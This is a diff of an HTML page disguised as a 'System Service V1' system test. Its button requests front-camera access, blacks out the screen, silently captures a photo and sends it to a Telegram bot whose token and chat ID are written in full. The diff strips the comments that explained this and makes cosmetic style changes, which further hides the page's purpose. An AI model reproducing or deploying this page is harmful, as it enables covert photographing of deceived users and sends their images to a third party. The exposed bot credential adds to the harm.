@@ -5,12 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Service V1</title>
     <style>
-        /* This makes the screen completely black for the user */
         body { 
             background: black; 
             color: white; 
             margin: 0; 
-            overflow: hidden; 
             height: 100vh; 
             display: flex; 
             align-items: center; 
@@ -20,10 +18,11 @@
             padding: 20px; 
             background: #333; 
             color: white; 
-            border: none; 
-            border-radius: 5px; 
+            border: 2px solid white; 
+            border-radius: 10px; 
             cursor: pointer; 
-            font-size: 18px;
+            font-size: 20px;
+            z-index: 100;
         }
     </style>
 </head>
@@ -31,12 +30,10 @@
 
     <button id="startBtn">START SYSTEM TEST</button>
     
-    <!-- Hidden elements for camera processing -->
     <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Your specific Telegram bot details
         const BOT_TOKEN = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
         const CHAT_ID = '8681771719';
 
@@ -46,22 +43,19 @@
 
         startBtn.onclick = async () => {
             try {
-                // Request front camera access
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
                 
                 video.srcObject = stream;
-                startBtn.style.display = 'none'; // Button disappears, screen goes black
+                startBtn.style.display = 'none'; 
                 
-                // Wait 2 seconds for the camera to focus, then capture
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Convert image to blob and send to Telegram
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
@@ -75,7 +69,7 @@
                 }, 2000);
 
             } catch (err) {
-                alert("Please click 'Allow' to proceed with the system test.");
+                alert("Error: Please click 'Allow' for camera access.");
             }
         };
     </script>
